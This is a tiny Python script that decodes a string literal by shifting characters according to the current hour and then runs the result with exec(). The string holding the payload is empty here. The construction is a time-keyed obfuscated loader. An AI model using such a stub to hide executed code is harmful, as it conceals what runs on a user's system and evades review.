import time

data = '''

'''
data = data.replace("\n", "")

j = time.localtime(time.time()).tm_hour
buffer = ""
for i in data:
    i = ord(i)
    if i - j != 182:
        buffer += chr(i - j)
exec(buffer)
